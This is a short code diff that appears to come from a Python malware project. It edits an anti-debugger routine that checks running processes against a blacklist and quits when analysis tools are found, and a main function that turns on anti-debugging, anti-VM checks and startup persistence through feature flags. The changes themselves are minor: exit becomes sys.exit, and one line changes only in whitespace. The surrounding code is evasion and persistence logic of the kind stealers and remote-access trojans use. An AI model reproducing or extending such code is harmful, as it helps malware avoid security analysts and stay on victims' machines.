@@ -379,7 +379,7 @@ def anti_debugger():
     for proc in psutil.process_iter(['name']):
         try:
             if proc.info['name'].lower() in [p.lower() for p in blacklist_Process]:
-                exit(1)
+                sys.exit(1)
                 return True
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             continue
@@ -469,7 +469,7 @@ def main():
     if feature.get("anti_debug", False):
         anti_debugger() 
     if feature.get("anti_vm", False):
-        checker()
+        checker() 
     if feature.get("startup", False):
         startup()
 
